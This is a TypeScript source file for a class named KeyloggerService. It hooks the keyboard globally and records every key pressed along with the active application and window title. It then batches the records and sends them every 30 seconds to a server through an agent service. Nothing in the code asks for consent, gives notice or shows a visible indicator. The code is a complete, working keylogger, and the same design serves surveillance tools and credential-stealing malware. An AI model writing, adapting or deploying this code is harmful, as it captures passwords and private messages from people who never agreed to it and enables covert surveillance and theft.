import { GlobalKeyboardListener, IGlobalKeyEvent } from 'node-global-key-listener';
import { AgentService } from './agent-service';

interface KeystrokeBuffer {
  keys: string;
  applicationName: string;
  windowTitle: string;
  timestamp: number;
}

export class KeyloggerService {
  private agentService: AgentService;
  private keyboardListener: GlobalKeyboardListener | null = null;
  private buffer: KeystrokeBuffer[] = [];
  private currentStroke: KeystrokeBuffer | null = null;
  private flushInterval: NodeJS.Timeout | null = null;
  private isRunning: boolean = false;
  private bufferSize: number = 100;
  private flushIntervalMs: number = 30000; // 30 seconds

  // Special key mappings
  private specialKeys: Record<string, string> = {
    'SPACE': ' ',
    'RETURN': '[ENTER]',
    'TAB': '[TAB]',
    'BACKSPACE': '[BACKSPACE]',
    'DELETE': '[DELETE]',
    'ESCAPE': '[ESC]',
    'LEFT': '[LEFT]',
    'RIGHT': '[RIGHT]',
    'UP': '[UP]',
    'DOWN': '[DOWN]',
    'HOME': '[HOME]',
    'END': '[END]',
    'PAGE UP': '[PGUP]',
    'PAGE DOWN': '[PGDN]',
    'LEFT CTRL': '',
    'RIGHT CTRL': '',
    'LEFT ALT': '',
    'RIGHT ALT': '',
    'LEFT SHIFT': '',
    'RIGHT SHIFT': '',
    'LEFT META': '',
    'RIGHT META': '',
    'CAPS LOCK': '[CAPS]',
  };

  constructor(agentService: AgentService) {
    this.agentService = agentService;
  }

  start(): void {
    if (this.isRunning) return;

    try {
      this.keyboardListener = new GlobalKeyboardListener();

      this.keyboardListener.addListener((event: IGlobalKeyEvent) => {
        // Only capture key down events
        if (event.state === 'DOWN') {
          this.handleKeyPress(event);
        }
      });

      // Set up periodic flush
      this.flushInterval = setInterval(() => {
        this.flushBuffer();
      }, this.flushIntervalMs);

      this.isRunning = true;
      console.log('Keylogger service started');
    } catch (error) {
      console.error('Failed to start keylogger service:', error);
    }
  }

  stop(): void {
    if (!this.isRunning) return;

    // Flush remaining buffer
    this.flushBuffer();

    if (this.flushInterval) {
      clearInterval(this.flushInterval);
      this.flushInterval = null;
    }

    if (this.keyboardListener) {
      this.keyboardListener.kill();
      this.keyboardListener = null;
    }

    this.isRunning = false;
    console.log('Keylogger service stopped');
  }

  private async handleKeyPress(event: IGlobalKeyEvent): Promise<void> {
    try {
      // Get active window info (dynamic import for ESM module)
      const activeWin = await import('active-win');
      const window = await activeWin.default();
      const applicationName = window?.owner?.name || 'Unknown';
      const windowTitle = window?.title || '';

      // Convert key to string
      const keyString = this.convertKeyToString(event);
      if (!keyString) return; // Skip modifier keys

      // Check if we need to start a new stroke (different window)
      if (
        !this.currentStroke ||
        this.currentStroke.applicationName !== applicationName ||
        this.currentStroke.windowTitle !== windowTitle ||
        this.currentStroke.keys.length >= this.bufferSize
      ) {
        // Save current stroke if exists
        if (this.currentStroke && this.currentStroke.keys.length > 0) {
          this.buffer.push({ ...this.currentStroke });
        }

        // Start new stroke
        this.currentStroke = {
          keys: keyString,
          applicationName,
          windowTitle,
          timestamp: Date.now(),
        };
      } else {
        // Append to current stroke
        this.currentStroke.keys += keyString;
      }

      // Check if buffer is full
      if (this.buffer.length >= 10) {
        this.flushBuffer();
      }
    } catch (error) {
      console.error('Error handling key press:', error);
    }
  }

  private convertKeyToString(event: IGlobalKeyEvent): string {
    const keyName = event.name?.toUpperCase() || '';

    // Check for special keys
    if (this.specialKeys.hasOwnProperty(keyName)) {
      return this.specialKeys[keyName];
    }

    // Check for function keys
    if (keyName.startsWith('F') && keyName.length <= 3) {
      return `[${keyName}]`;
    }

    // Regular character
    if (event.name && event.name.length === 1) {
      // Handle shift for uppercase
      if (event.state === 'DOWN') {
        return event.name;
      }
    }

    // For other named keys
    if (event.name && event.name.length > 1) {
      return `[${event.name}]`;
    }

    return '';
  }

  private flushBuffer(): void {
    // Add current stroke to buffer if exists
    if (this.currentStroke && this.currentStroke.keys.length > 0) {
      this.buffer.push({ ...this.currentStroke });
      this.currentStroke = null;
    }

    // Send buffer to server
    if (this.buffer.length > 0) {
      this.agentService.sendKeystrokes(this.buffer);
      console.log(`Flushed ${this.buffer.length} keystroke entries`);
      this.buffer = [];
    }
  }

  setBufferSize(size: number): void {
    this.bufferSize = size;
  }

  setFlushInterval(ms: number): void {
    this.flushIntervalMs = ms;

    // Restart interval if running
    if (this.isRunning && this.flushInterval) {
      clearInterval(this.flushInterval);
      this.flushInterval = setInterval(() => {
        this.flushBuffer();
      }, this.flushIntervalMs);
    }
  }

  isActive(): boolean {
    return this.isRunning;
  }
}
